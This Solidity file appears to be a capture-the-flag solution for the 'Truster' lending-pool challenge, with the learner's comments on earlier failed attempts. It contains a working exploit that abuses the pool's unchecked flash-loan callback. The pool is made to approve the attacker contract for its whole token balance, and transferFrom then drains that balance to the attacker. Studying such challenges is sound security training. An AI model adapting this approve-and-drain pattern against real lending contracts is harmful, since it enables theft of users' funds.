//SPDX License-Identifer: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "./TrusterLenderPool.sol";

contract AttackTrusterLenderPool{
    using SafeMath for address;
    using Address for address;

    TrusterLenderPool public immutable i_pool;
    IERC20 public immutable dvt;
    
    constructor(address poolAddr, address tknAddr){
        i_pool = TrusterLenderPool(poolAddr);
        dvt = IERC20(tknAddr);
    }

    function attack(address attacker, address target, address attackerContract) public{
        // the target should be the token itself
        uint256 pool_balance =  dvt.balanceOf(address(i_pool));
        // My first solution 
        // bytes memory payload = abi.encodeWithSignature("approve(address,uint256)", attacker, pool_balance);
        // My second solution 
        // bytes memory payload = abi.encodeWithSignature("approve(address,uint256)", address(dvt),pool_balance);


        // Whats the difference between the answer and my answer
        //bytes memory payload = abi.encodeWithSignature("approve(address,uint256)",address(this),pool_balance);

        // i keep getting ERC20: transfer amount exceeds allowance so i did the code below to test for errors in pool balances 
        //require(pool_balance == 1000000 ether ,"It don't work");
        // But there was no error

        // Then i tried after i looked at the answer
        bytes memory payload = abi.encodeWithSignature("approve(address,uint256)",attackerContract,pool_balance);


        /**
         * My error was that i was approving the attacker to spend the tokens
         * I also tried to make it so that the dvt is approved to spend the tokens
         * But in reality you want the attacker contract to be approved because you care calling dvt.transferFrom(sender, recipient, amount); in the context of the
         * attacker contract
         * which means that the attacker contract should be the contract with the rights to spend the pool's tokens
         * So in this case address(this) is the attacker contract
         * Through this i know have a better understanding of the ERC 20 approve function
         * The approve function when called in the context of contract A
         */

        i_pool.flashLoan(0, attacker, target, payload);
        dvt.transferFrom(address(i_pool),attacker,pool_balance);
    }
}